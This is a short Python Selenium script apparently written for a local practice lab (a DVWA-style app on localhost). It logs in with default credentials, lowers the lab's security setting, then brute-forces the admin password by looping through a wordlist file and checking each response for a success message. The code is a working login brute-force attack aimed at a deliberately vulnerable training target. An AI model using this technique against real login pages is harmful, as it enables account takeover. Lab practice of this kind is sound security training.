from selenium import webdriver
from selenium.webdriver.support.ui import Select


driver = webdriver.Chrome()
driver.get("http://localhost:4280/")

username = 'admin'
password = 'password'

# Find the username and password input fields on the login page using various locators
username_field = driver.find_element('name', 'username')  
password_field = driver.find_element('name', 'password') 

# Enter the username and password into their respective fields
username_field.send_keys(username)
password_field.send_keys(password)

# Find and click the login button
login_button = driver.find_element('name', 'Login')  
login_button.click()

# After logging in, navigate to the desired page
driver.get("http://localhost:4280/security.php")

select_element = driver.find_element('name', 'security') 

# Use the Select class to interact with the <select> element
select = Select(select_element)

# Select the option with value "low"
select.select_by_value('low')

submit_button = driver.find_element('name', 'seclev_submit')
submit_button.click()


# get the list of passwords
def read_passwords_file(filename):
    password_list = []
    with open(filename, 'r') as file:
        for line in file:
            # Remove leading/trailing whitespaces and newlines
            password = line.strip()
            password_list.append(password)
    return password_list

# Replace 'passwords.txt' with the actual path to your file
file_path = 'passwords.txt'
passwords = read_passwords_file(file_path)

for pw in passwords:
    user = 'admin'
    driver.get(f"http://localhost:4280/vulnerabilities/brute/?username={user}&password={pw}&Login=Login#")
    get_source = driver.page_source
    target_text = 'Welcome to the password protected area'
    if target_text in get_source:
        print(f'User: {user}, password: {pw}')
        break

# now we start sending a bunch of GET requests to see which password is right 


print()